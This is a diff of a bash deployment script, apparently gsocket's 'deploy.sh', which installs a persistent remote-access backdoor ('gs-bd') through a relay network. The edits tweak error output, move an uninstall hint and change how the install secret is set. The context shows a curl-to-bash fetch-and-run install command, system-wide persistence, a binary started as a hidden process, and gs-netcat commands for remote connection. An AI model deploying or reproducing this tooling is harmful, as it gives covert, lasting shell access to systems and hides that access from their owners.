@@ -425,7 +425,9 @@ OK_OUT()
 FAIL_OUT()
 {
 	echo -e 1>&2 "..[${CR}FAILED${CN}]"
-	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
+	for str in "$@"; do
+		echo -e 1>&2 "--> $str"
+	done
 }
 
 WARN()
@@ -448,6 +450,8 @@ WARN_EXECFAIL()
 
 HOWTO_CONNECT_OUT()
 {
+	# After all install attempts output help how to uninstall
+	echo -e 1>&2 "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
 	echo -e 1>&2 "--> To connect use one of the following:
 --> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
 --> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
@@ -801,7 +805,7 @@ test_network()
 	}
 
 	[[ $ret -eq 0 ]] && {
-		FAIL_OUT "Secret '${GS_SECRET}' is already used on a different host."
+		FAIL_OUT "Secret '${GS_SECRET}' is already used."
 		HOWTO_CONNECT_OUT
 		exit_code 0
 	}
@@ -822,7 +826,7 @@ test_network()
 
 try_network()
 {
-	echo -en 2>&1 "Testing Connectivity.................................................."
+	echo -en 2>&1 "Testing Global Socket Relay Network..................................."
 	test_network
 	if [[ -n "$IS_TESTNETWORK_OK" ]]; then
 		OK_OUT
@@ -916,8 +920,6 @@ gs_start()
 	[[ -n "$IS_SYSTEMD" ]] && gs_start_systemd
 	[[ -n "$IS_GS_RUNNING" ]] && return
 
-
-
 	# Scenario to consider:
 	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-bd'
 	# ./deploy.sh -> re-installs new secret. Start gs-bd with _new_ secret.
@@ -961,8 +963,9 @@ init_vars
 
 init_setup
 
+
 # User supplied install-secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
-[[ -n "$X" ]] && GS_SECRET="$X"
+[[ -z $GS_SECRET ]] && [[ -n "$X" ]] && GS_SECRET="$X"
 
 if [[ $UID -eq 0 ]]; then
 	[[ -z $GS_SECRET ]] && gs_secret_reload "$SYSTEMD_SEC_FILE" 
@@ -982,7 +985,6 @@ WARN_EXECFAIL
 # S= is set. Do not install but connect to remote using S= as secret.
 [[ -n "$S" ]] && gs_access
 
-
 # -----BEGIN Install permanentally-----
 # Try to install system wide. This may also start the service.
 [[ -z $GS_NOINST ]] && [[ $UID -eq 0 ]] && install_system
@@ -996,8 +998,7 @@ WARN_EXECFAIL
 if [[ -z "$IS_INSTALLED" ]]; then
 	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
 fi
-# After all install attempts output help how to uninstall
-echo -e 1>&2 "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
+
 
 printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
 if [[ -n "$GS_NOSTART" ]]; then
